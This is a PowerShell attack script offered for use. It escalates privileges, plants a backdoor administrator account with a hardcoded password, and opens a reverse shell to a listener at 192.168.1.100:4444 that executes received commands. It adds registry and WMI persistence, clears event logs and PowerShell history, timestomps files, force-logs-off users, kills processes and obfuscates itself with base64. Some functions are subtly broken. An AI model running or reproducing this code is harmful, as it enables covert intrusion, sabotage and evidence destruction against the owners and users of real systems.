# Step 1: Escalate Privileges using RunAs
function Escalate-Privileges {
    Start-Process powershell -Verb RunAs
}

# Step 2: Create Immutable User Profile (Administrator Rights Required)
function Create-Immutable-User {
    $username = "secureuser"
    $password = ConvertTo-SecureString "SuperSecurePassword123!" -AsPlainText -Force
    New-LocalUser $username -Password $password -FullName "Secure User" -Description "Immutable Profile User"
    Add-LocalGroupMember -Group "Administrators" -Member $username
    
    # Set user profile as read-only (immutable)
    $profilePath = "C:\Users\$username"
    icacls $profilePath /deny $username:(W)
}

# Step 3: Switch to the newly created user account
function Switch-User {
    $username = "secureuser"
    $password = "SuperSecurePassword123!"
    
    # Encoded command to avoid logging plain-text credentials
    $command = {
        param($username, $password)
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
        Start-Process "powershell" -Credential $credential -ArgumentList "-NoExit" -Wait
    }
    
    # Encode command for obfuscation and execution
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
    Start-Process powershell.exe -ArgumentList "-encodedCommand $encodedCommand"
}

# Step 4: Set up a Reverse Shell for Persistent Access
function Open-Reverse-Shell {
    $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)  # Change IP/Port to your listener
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (iex $data 2>&1 | Out-String )
        $sendback2  = $sendback + "PS " + (pwd).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush() 
    }
    $client.Close()
}

# Step 5: Add Persistence via Registry
function Add-Registry-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $scriptPath = "C:\Windows\Temp\reverse_shell.ps1"
    
    # Create the reverse shell script in Temp
    $reverseShellScript = @"
    `$(Open-Reverse-Shell)
"@
    $reverseShellScript | Out-File $scriptPath
    
    # Add to registry to ensure persistence on reboot
    Set-ItemProperty -Path $regPath -Name "ReverseShellPersistence" -Value $scriptPath
}

# Step 6: Add WMI Persistence (runs on system startup)
function Add-WMI-Persistence {
    $scriptPath = "C:\Windows\Temp\reverse_shell.ps1"
    $triggerQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_OperatingSystem'"
    Register-WmiEvent -Query $triggerQuery -Action { & $scriptPath } -SourceIdentifier "WMI-Persistence"
}

# Step 7: Anti-Forensics - Delete PowerShell History and Logs
function Delete-PowerShell-History {
    # Clear PowerShell History
    Remove-Item (Get-PSReadlineOption).HistorySavePath

    # Clear Event Logs
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    wevtutil cl "Security"
    wevtutil cl "System"
    wevtutil cl "Application"
}

# Step 8: Timestomping to Hide Changes
function TimeStomp {
    $file = "C:\Windows\Temp\reverse_shell.ps1"
    $lastAccessTime = Get-Date "1/1/2000"
    $lastWriteTime = Get-Date "1/1/2000"
    $creationTime = Get-Date "1/1/2000"

    # Set timestamps to hide the existence of the script
    (Get-Item $file).LastAccessTime = $lastAccessTime
    (Get-Item $file).LastWriteTime = $lastWriteTime
    (Get-Item $file).CreationTime = $creationTime
}

# Step 9: Kill Other Processes and Hijack Sessions
function Kill-Sessions-And-Users {
    # List all active users and sessions
    $sessions = query user
    foreach ($session in $sessions) {
        # Log off users
        logoff $session.SessionId
    }

    # Kill active processes (non-system)
    Get-Process | Where-Object { $_.ProcessName -notlike "system" -and $_.ProcessName -notlike "services" } | Stop-Process -Force
}

# Step 10: Script Obfuscation (Base64 encode critical parts of the script)
function Obfuscate-Script {
    $script = @"
    `$(Open-Reverse-Shell)
"@
    $encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
    [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedScript)) | Out-File "C:\Windows\Temp\reverse_shell_obfuscated.ps1"
}

# Main function to run all steps
function Main {
    Escalate-Privileges
    Create-Immutable-User
    Switch-User  # Switch to the secure user
    Open-Reverse-Shell  # Start reverse shell connection
    Add-Registry-Persistence  # Add reverse shell to registry for persistence
    Add-WMI-Persistence  # Add WMI persistence for reverse shell
    Delete-PowerShell-History  # Delete logs and PowerShell history
    TimeStomp  # Timestomp to hide the reverse shell file
    Kill-Sessions-And-Users  # Hijack or log off other users
    Obfuscate-Script  # Obfuscate the reverse shell script for stealth
}

# Run the main function
Main
